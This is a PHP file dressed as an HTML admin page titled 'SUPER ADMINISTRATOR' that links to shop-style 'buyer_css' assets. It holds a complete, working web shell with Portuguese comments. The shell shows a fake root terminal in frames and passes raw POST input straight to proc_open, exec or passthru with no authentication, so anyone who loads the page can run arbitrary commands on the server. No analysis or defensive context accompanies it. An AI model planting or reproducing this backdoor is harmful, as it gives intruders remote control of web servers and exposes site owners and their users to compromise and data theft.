<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>SUPER ADMINISTRATOR</title>
    
    <link rel="stylesheet" type="text/css" href="./buyer_css/nav.css">
    <link rel="stylesheet" type="text/css" href="./buyer_css/iconfont.css">
    <link rel="stylesheet" type="text/css" href="./buyer_css/myself.css"><link rel="stylesheet" type="text/css" href="./buyer_css/myself.css">
    <script src="./buyer_css/hm.js"></script><script type="text/javascript" src="./buyer_css/jquery.min.js"></script>
    <script type="text/javascript" src="./buyer_css/nav.js"></script>
    
</head>
<body style="">
<?php
$file=basename($_SERVER['PHP_SELF']);
if (!isset($_GET['pg'])) {
    ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Frameset//EN"
        "http://www.w3.org/TR/REC-html40/frameset.dtd">
<html>
<head>
<title>[root&#64;<?php echo $_SERVER['HTTP_HOST']; ?>]&#36;</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Generator" content="EditPlus">

</head>
<frameset rows="80,*" cols="*">
    <frame src="<?php echo $file; ?>?pg=p" name="prompt">
    <frame src="<?php echo $file; ?>?pg=t" name="term">
</frameset>
</html>
<?php
}
elseif ($_GET['pg']=='t') {

    //======================================================
    $use_func='exec';            // 'exec' ou 'passthru'
    $getcwd=true;                /* false se getcwd()
                                    estiver desabilitada */
    //======================================================

    session_start();
    $_SESSION['numcmds']++;
    $cur='&nbsp;<span id="cur"></span>';

    function parse_cmd()
    {
        global $cmd;
        global $args;
        $pos=strpos(trim($cmd)," ");
        if ($pos) {
            $args=trim(substr($cmd,$pos));
            $cmd=trim(substr($cmd,0,$pos));
        }
    }

    function doout()
    {
        global $cmd, $args, $prmpt, $output, $dir;
        $prmpt='<span class="prompt">';
        $prmpt.='[root@'.$_SERVER['HTTP_HOST'].']:'."$dir".'></span>';
        $cmdout='<a name="'.$_SESSION['numcmds'].'"></a><span class="cmd">';
        $cmdout.=trim("$cmd $args").'</span>';
        $_SESSION['history']=$_SESSION['history']." ".$cmdout."\n$output<hr>\n$prmpt";
    }

    function run_cmd()
    {
        global $cmd, $win, $args, $use_func;
        ob_start();      
        if ((!$win) && function_exists('proc_open')) {
            $pipes=array(1 => array('pipe', 'w'),2 => array('pipe', 'w'));
            $p=proc_open($_POST['cmd'], $pipes, $io);
            while (!feof($io[1])) {
                $out.=fgets($io[1]);
            }
            while (!feof($io[2])) {
                $out.=fgets($io[2]);
            }
            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
            echo $out;
        }
        else {
            if ($use_func=='exec') {
                exec(stripslashes($_POST['cmd']),$out,$cr);
                echo implode("\n",$out);
            }
            else if ($use_func=='passthru') {
                passthru(stripslashes($_POST['cmd']),$cr);
            }
            if ($cr) { echo "Erro"; }
        }
        $output=ob_get_contents();
        ob_end_clean();
        if ($win) {
            $output=dos_conv($output);
        }
        $output=htmlentities($output,ENT_COMPAT,'windows-1252');
        if ("ls"==trim($cmd) && substr($args,0,2)=='-l') {
            $output=preg_replace('#((?m)^d[^\n]+)#',"<span style=\"color: #009BE6\">$1</span>",$output);
        }
        return $output;
    }

    function get_dir()
    {
        global $getcwd;
        if ($getcwd) {
            return getcwd();
        }
        else {
            exec('pwd',$res);
            return $res[0];
        }
    }


    function dos_conv($string)
    {
        $tbl=array( '&#376;'=>'&#402;',
                    'Å'=>'&#8224;',
                    'Î'=>'ç',
                    'µ'=>'Á',
                    '¶'=>'Â',
                    'Ç'=>'Ã',
                    '&#381;'=>'Ä',
                    ''=>'Å',
                    '&#8217;'=>'Æ',
                    '&#8364;'=>'Ç',
                    'Ô'=>'È',
                    ''=>'É',
                    'Ò'=>'Ê',
                    'Ó'=>'Ë',
                    'Þ'=>'Ì',
                    'Ö'=>'Í',
                    '×'=>'Î',
                    'Ø'=>'Ï',
                    'Ñ'=>'Ð',
                    '¥'=>'Ñ',
                    'ã'=>'Ò',
                    'à'=>'Ó',
                    'â'=>'Ô',
                    'å'=>'Õ',
                    '&#8482;'=>'Ö',
                    '&#382;'=>'×',
                    ''=>'Ø',
                    'ë'=>'Ù',
                    'é'=>'Ú',
                    'ê'=>'Û',
                    '&#353;'=>'Ü',
                    'í'=>'Ý',
                    'è'=>'Þ',
                    'á'=>'ß',
                    '&#8230;'=>'à',
                    ' '=>'á',
                    '&#402;'=>'â',
                    'Æ'=>'ã',
                    '&#8222;'=>'ä',
                    '&#8224;'=>'å',
                    '&#8216;'=>'æ',
                    '&#8225;'=>'ç',
                    '&#352;'=>'è',
                    '&#8218;'=>'é',
                    '&#710;'=>'ê',
                    '&#8240;'=>'ë',
                    ''=>'ì',
                    '¡'=>'í',
                    '&#338;'=>'î',
                    '&#8249;'=>'ï',
                    'Ð'=>'ð',
                    '¤'=>'ñ',
                    '&#8226;'=>'ò',
                    '¢'=>'ó',
                    '&#8220;'=>'ô',
                    'ä'=>'õ',
                    '&#8221;'=>'ö',
                    'ö'=>'÷',
                    '&#8250;'=>'ø',
                    '&#8212;'=>'ù',
                    '£'=>'ú',
                    '&#8211;'=>'û',
                    ''=>'ü',
                    'ì'=>'ý',
                    'ç'=>'þ',
                    '&#732;'=>'ÿ' );
        return strtr($string,$tbl);
    }

    ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.1 Transitional//EN">
<head>
<title>Terminal</title>
<style type="text/css">
body { color: #00FF00; background-color: black; }
.cmd { color: #A8D3FF; }
.prompt { color: #CCCCCC; }
</style>
</head>
<body>
<pre><?php
    ini_set('track_errors',1);
    $win=(strpos(strtolower(PHP_OS),'win')!==false);
    if ($win) {
        $dirsep="\\";
    }
    else {
        $dirsep="/";
    }
    if (isset($_SESSION['curdir'])) {
        @chdir($_SESSION['curdir']);
    }
    else {
        $_SESSION['curdir']=get_dir();
    }
    $dir=get_dir();
    $cmd=stripslashes($_POST['cmd']);
    parse_cmd($cmd);
    if (!isset($_SESSION['history'])) {
        $cmd='cls';
    }
    switch ($cmd) {
        case 'clear':
        case 'cls':
            doout();
            $_SESSION['history']=$prmpt;
            break;
        case 'cd':
            if (@chdir($args.$dirsep)) {;        
                $_SESSION['curdir']=get_dir();
                $output='O diret&oacute;rio atual &eacute; '.$_SESSION['curdir'];
            }
            else {
                $output=$php_errormsg;
            }
            $dir=$_SESSION['curdir'];
            doout();
            break;
        case 'man':
            $re='%(.)\1%';
            $output=run_cmd();
            $output=preg_replace($re,'$1',$output);
            $output=str_replace(array('_','-','|'),'',$output);
            $output=str_replace('&acirc;&circ;&rsquo;&acirc;&circ;&rsquo;',
                                '-',$output);
            $output=str_replace('&acirc;&circ;&rsquo;','-',$output);
            doout();
            break;
        default:
            if (strlen($cmd)) {
                $output=run_cmd();
            }
            doout();
    }
    echo $_SESSION['history'].$cur;
    ?>
</pre>
<br><br><br><br><br><br><br><br><br><br><br><br><br>
<script language="JavaScript" type="text/javascript">
<!--
location.href="#<?php echo $_SESSION['numcmds']; ?>";
//-->
</script>
</body>
</html>
<?php
}
else {
    ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#45;&#58;&#175;&#247;&#247;&#247;&#175;&#58;&#45;</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Generator" content="EditPlus">
<script language="JavaScript" type="text/javascript">
<!--

function limpa()
{
    if (entrada.value.length) {
        numcmds++
        curcmd++;
        lastcmd=curcmd;
        lista[numcmds]=entrada.value;
        document.form1.cmd.value=entrada.value;
        entrada.value="";
        entrada.focus();
        self.focus();
        return true;
    }
    else {
        return false;
    }
}

function findcmd(cod)
{
    if (cod==40) {
        if (lastcmd>0) {
            entrada.value=lista[lastcmd];
            if (lastcmd>1) {
                lastcmd--;
            }
        }
    }
    else if (cod==38) {
        if (lastcmd<numcmds) {
            entrada.value=lista[lastcmd+1];
            if (lastcmd<numcmds) {
                lastcmd++;
            }
        }
    }
}

function writit()
{
    d=parent.frames[1].document;
    text=entrada.value;
    if (d.getElementById) {
        x = d.getElementById('cur');
        x.innerHTML = text;
    }
    else if (d.all) {
        x = d.all('cur');
        x.innerHTML = text;
    }
}
//-->
</script>
<style type="text/css" title="">
body { background-color: #004040; color: #CEE3D6; }
</style>
</head>

<body>
<br>
<div align="center">
<form method="post" action="<?php echo $file; ?>?pg=t" target="term" name="form1" onsubmit="limpa()">
  <label for="tcmd">[<?php echo "root@".$_SERVER['HTTP_HOST']; ?>]&#36; </label>
  <input type="text" name="entrada" size="40" id="tcmd"
    onkeydown="findcmd(event.keyCode)"
    onkeyup="writit()">
  <input type="hidden" name="cmd" value="">
  <input type="submit" name="Submit" value="Submit">
</form>
</div>
<script language="JavaScript" type="text/javascript">
<!--
lista=new Array();
entrada=document.form1.entrada;
entrada.focus();
numcmds=0;
curcmd=0;
lastcmd=0;
//-->
</script>
</body>
</html>
<?php
} ?> 
</body>
</html>